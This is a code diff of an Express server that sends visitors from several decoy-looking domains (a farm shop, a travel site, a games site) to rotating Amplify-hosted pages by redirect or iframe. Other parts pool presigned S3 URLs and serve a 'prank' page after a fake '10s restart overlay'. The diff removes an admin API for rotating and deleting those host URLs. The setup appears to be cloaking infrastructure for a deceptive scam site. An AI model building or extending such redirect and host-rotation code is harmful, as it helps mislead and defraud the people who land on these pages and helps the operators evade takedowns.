@@ -16,7 +16,6 @@ const {
   DeleteAccessPointCommand,
   ListAccessPointsCommand,
 } = require("@aws-sdk/client-s3-control");
-const { AmplifyClient, DeleteAppCommand: DeleteAmplifyAppCommand } = require("@aws-sdk/client-amplify");
 const { getSignedUrl } = require("@aws-sdk/s3-request-presigner");
 
 // ─── Config ───────────────────────────────────────────────────────
@@ -29,8 +28,8 @@ const ACCOUNT_ID = process.env.AWS_ACCOUNT_ID || "654654618464";
 const BUCKET_NAME = process.env.BUCKET_NAME;
 const OBJECT_KEY = process.env.OBJECT_KEY || "index.html";
 
-const UPSTASH_REDIS_REST_URL   = process.env.UPSTASH_REDIS_REST_URL1;
-const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN1;
+const UPSTASH_REDIS_REST_URL   = process.env.UPSTASH_REDIS_REST_URL;
+const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 
 const BATCH_SIZE = 3000;
 const TOPUP_THRESHOLD = 300;
@@ -84,22 +83,20 @@ async function getRotationTarget(key) {
 //                    redirect to it (target is ignored)
 //   - "iframes3ap":  pop a unique presigned URL from the AP pool and
 //                    embed it in an iframe (target is ignored)
-const AMPLIFY_REDIS_KEY = "latest_amplify_url";
-const AMPLIFY_FALLBACK  = "https://main.d2g6g475cdrlvi.amplifyapp.com";
-
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairyfarmshop1.netlify.app": { method: "redirect", target: AMPLIFY_FALLBACK, redisKey: AMPLIFY_REDIS_KEY },
-    "https://takahirofarmfood.com":               { method: "redirect", target: AMPLIFY_FALLBACK, redisKey: AMPLIFY_REDIS_KEY },
-    "https://hiroakitravels.com":                 { method: "redirect", target: AMPLIFY_FALLBACK, redisKey: AMPLIFY_REDIS_KEY },
-    "https://teruogames.org":                     { method: "redirect", target: AMPLIFY_FALLBACK, redisKey: AMPLIFY_REDIS_KEY },
+    "https://naotoshidairyfarmshop1.netlify.app": { method: "redirect", target: "https://main.d3bvpprednb6hr.amplifyapp.com" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.d3bvpprednb6hr.amplifyapp.com" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://main.d3bvpprednb6hr.amplifyapp.com" },
+    "https://teruogames.org": { method: "redirect", target: "https://main.d3bvpprednb6hr.amplifyapp.com" },
   },
   dmc: {
-    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: AMPLIFY_FALLBACK, redisKey: AMPLIFY_REDIS_KEY },
-    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: AMPLIFY_FALLBACK, redisKey: AMPLIFY_REDIS_KEY },
+    // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
+    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://main.d3bvpprednb6hr.amplifyapp.com" },
+    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://main.d3bvpprednb6hr.amplifyapp.com" },
   },
   aomine: {
-    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: AMPLIFY_FALLBACK, redisKey: AMPLIFY_REDIS_KEY },
+    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.d3bvpprednb6hr.amplifyapp.com" },
   },
 };
 
@@ -593,14 +590,7 @@ const BUILD_PAYLOAD_HANDLERS = {
     }
     return buildPayloadIframe(target);
   },
-  redirect: async (entry) => {
-    let target = entry.target;
-    if (entry.redisKey) {
-      const dynamic = await getRotationTarget(entry.redisKey);
-      if (dynamic) target = dynamic;
-    }
-    return buildPayloadRedirect(target);
-  },
+  redirect: async (entry) => buildPayloadRedirect(entry.target),
   s3ap: async () => {
     const presigned = await nextPresignedUrl();
     if (!presigned) return null;
@@ -677,17 +667,16 @@ app.use(express.static(path.join(__dirname, "website2"), { index: false }));
 
 // 2) The endpoint website1 calls after the 10s restart overlay.
 //    Returns website2/index.html as raw HTML, which website1 loads via iframe.srcdoc.
-app.get("/fetchPrank", async (req, res) => {
-  if (!await isAuthorized(req)) return res.status(403).send("Forbidden");
+app.get("/fetchPrank", (req, res) => {
+  if (!isAuthorized(req)) return res.status(403).send("Forbidden");
   res.sendFile(path.join(__dirname, "website2", "index.html"));
 });
 
-async function isAuthorized(req) {
-  const origin  = req.get("origin");
-  const dynamic = await getRotationTarget(AMPLIFY_REDIS_KEY);
-  const allowed = new Set([AMPLIFY_FALLBACK]);
-  if (dynamic) allowed.add(dynamic);
-  return allowed.has(origin);
+function isAuthorized(req) {
+  // Replace with whatever "who is requesting" check you want.
+  // Simple Netlify-origin allowlist:
+  const allowed = ["https://main.d3bvpprednb6hr.amplifyapp.com"];
+  return allowed.includes(req.get("origin"));
 }
 
 app.get("/status", async (_req, res) => {
@@ -1392,187 +1381,6 @@ app.get("/tracker.js", (_req, res) => {
 });
 
 // ─── end Analytics ────────────────────────────────────────────────
-
-// ─── Amplify Admin API ────────────────────────────────────────────
-//
-// Used by the Netlify-hosted admin page.
-// Required env vars: ADMIN_API_KEY, GITHUB_PAT, GITHUB_REPO
-// Optional env var:  WORKFLOW_FILE (default: update-amplify.yml)
-//
-// All routes are protected by X-Admin-Key header.
-
-const ADMIN_API_KEY  = process.env.ADMIN_API_KEY  || "";
-const GITHUB_PAT     = process.env.GITHUB_PAT     || "";
-const GITHUB_REPO    = process.env.GITHUB_REPO    || "";   // "owner/repo"
-const WORKFLOW_FILE  = process.env.WORKFLOW_FILE  || "update-amplify.yml";
-
-const AMPLIFY_HISTORY_KEY  = "amplify_url_history";
-const AMPLIFY_TS_KEY       = "latest_amplify_url:updated_at";
-const AMPLIFY_HISTORY_MAX  = 50;
-
-const amplifyClient = new AmplifyClient({ region: REGION });
-
-// Helper: run any Upstash REST command
-async function upstashCmd(...args) {
-  const res  = await fetch(UPSTASH_REDIS_REST_URL, {
-    method:  "POST",
-    headers: { Authorization: `Bearer ${UPSTASH_REDIS_REST_TOKEN}`, "Content-Type": "application/json" },
-    body:    JSON.stringify(args),
-  });
-  const data = await res.json();
-  if (!res.ok) throw new Error(`Upstash ${res.status}: ${JSON.stringify(data)}`);
-  return data.result;
-}
-
-function requireAdminKey(req, res, next) {
-  if (!ADMIN_API_KEY || req.headers["x-admin-key"] !== ADMIN_API_KEY)
-    return res.status(401).json({ error: "Unauthorized" });
-  next();
-}
-
-async function githubFetch(endpoint, options = {}) {
-  return fetch(`https://api.github.com${endpoint}`, {
-    ...options,
-    headers: {
-      Authorization: `Bearer ${GITHUB_PAT}`,
-      Accept: "application/vnd.github+json",
-      "X-GitHub-Api-Version": "2022-11-28",
-      "Content-Type": "application/json",
-      ...(options.headers || {}),
-    },
-  });
-}
-
-// GET /api/amplify/current-url
-app.get("/api/amplify/current-url", requireAdminKey, async (req, res) => {
-  try {
-    const [url, updatedAt] = await Promise.all([
-      upstashCmd("GET", AMPLIFY_REDIS_KEY),
-      upstashCmd("GET", AMPLIFY_TS_KEY),
-    ]);
-    res.json({ url, updatedAt });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// POST /api/amplify/update-url — archive old URL to history then set new one
-app.post("/api/amplify/update-url", requireAdminKey, async (req, res) => {
-  const { url } = req.body;
-  if (!url || typeof url !== "string")
-    return res.status(400).json({ error: '"url" is required' });
-  try {
-    const now    = new Date().toISOString();
-    const oldUrl = await upstashCmd("GET", AMPLIFY_REDIS_KEY);
-    if (oldUrl && oldUrl !== url) {
-      const entry = JSON.stringify({ url: oldUrl, createdAt: now });
-      await upstashCmd("LPUSH", AMPLIFY_HISTORY_KEY, entry);
-      await upstashCmd("LTRIM", AMPLIFY_HISTORY_KEY, 0, AMPLIFY_HISTORY_MAX - 1);
-    }
-    await upstashCmd("MSET", AMPLIFY_REDIS_KEY, url, AMPLIFY_TS_KEY, now);
-    res.json({ success: true, url, updatedAt: now });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// GET /api/amplify/history
-app.get("/api/amplify/history", requireAdminKey, async (req, res) => {
-  try {
-    const raw     = await upstashCmd("LRANGE", AMPLIFY_HISTORY_KEY, 0, AMPLIFY_HISTORY_MAX - 1);
-    const history = (raw || []).map((item) => {
-      try {
-        let parsed = JSON.parse(item);
-        if (typeof parsed === "string") parsed = JSON.parse(parsed);
-        return (parsed && typeof parsed === "object") ? parsed : { url: String(parsed), createdAt: null };
-      } catch { return { url: typeof item === "string" ? item : "", createdAt: null }; }
-    }).filter((item) => item.url);
-    res.json({ history });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// POST /api/amplify/delete-apps — delete from Amplify + remove from Redis history
-app.post("/api/amplify/delete-apps", requireAdminKey, async (req, res) => {
-  const { appIds } = req.body;
-  if (!Array.isArray(appIds) || !appIds.length)
-    return res.status(400).json({ error: '"appIds" array is required' });
-
-  // Remove matching history entries first
-  try {
-    const rawHistory = await upstashCmd("LRANGE", AMPLIFY_HISTORY_KEY, 0, AMPLIFY_HISTORY_MAX - 1);
-    for (const rawEntry of (rawHistory || [])) {
-      if (appIds.some((id) => rawEntry.includes(id)))
-        await upstashCmd("LREM", AMPLIFY_HISTORY_KEY, 0, rawEntry);
-    }
-  } catch (err) {
-    console.error("[amplify-admin] history cleanup failed:", err.message);
-  }
-
-  // Delete from AWS Amplify
-  const results = await Promise.all(
-    appIds.map(async (appId) => {
-      try {
-        await amplifyClient.send(new DeleteAmplifyAppCommand({ appId }));
-        return { appId, success: true };
-      } catch (err) {
-        return { appId, success: false, error: err.message };
-      }
-    })
-  );
-  res.json({ results });
-});
-
-// POST /api/amplify/trigger-workflow
-app.post("/api/amplify/trigger-workflow", requireAdminKey, async (req, res) => {
-  if (!GITHUB_PAT || !GITHUB_REPO)
-    return res.status(503).json({ error: "GITHUB_PAT or GITHUB_REPO not configured" });
-  try {
-    const dispatchRes = await githubFetch(
-      `/repos/${GITHUB_REPO}/actions/workflows/${WORKFLOW_FILE}/dispatches`,
-      { method: "POST", body: JSON.stringify({ ref: "main" }) }
-    );
-    if (dispatchRes.status !== 204) {
-      const text = await dispatchRes.text();
-      return res.status(dispatchRes.status).json({ error: "GitHub API error", details: text });
-    }
-    await new Promise((r) => setTimeout(r, 3000));
-    const runsRes  = await githubFetch(`/repos/${GITHUB_REPO}/actions/runs?event=workflow_dispatch&per_page=5`);
-    const runsData = await runsRes.json();
-    const run = runsData.workflow_runs?.find(
-      (r) => r.path?.includes(WORKFLOW_FILE) && r.status !== "completed"
-    ) || runsData.workflow_runs?.[0];
-    res.json({ success: true, runId: run?.id, runUrl: run?.html_url });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// GET /api/amplify/workflow-status/:runId
-app.get("/api/amplify/workflow-status/:runId", requireAdminKey, async (req, res) => {
-  try {
-    const [runRes, jobsRes] = await Promise.all([
-      githubFetch(`/repos/${GITHUB_REPO}/actions/runs/${req.params.runId}`),
-      githubFetch(`/repos/${GITHUB_REPO}/actions/runs/${req.params.runId}/jobs`),
-    ]);
-    const run      = await runRes.json();
-    const jobsData = await jobsRes.json();
-    const job      = jobsData.jobs?.[0];
-    res.json({
-      status:     run.status,
-      conclusion: run.conclusion,
-      startedAt:  run.run_started_at,
-      steps: (job?.steps || []).map((s) => ({
-        number: s.number, name: s.name, status: s.status, conclusion: s.conclusion,
-      })),
-    });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// ─── end Amplify Admin API ────────────────────────────────────────
 
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
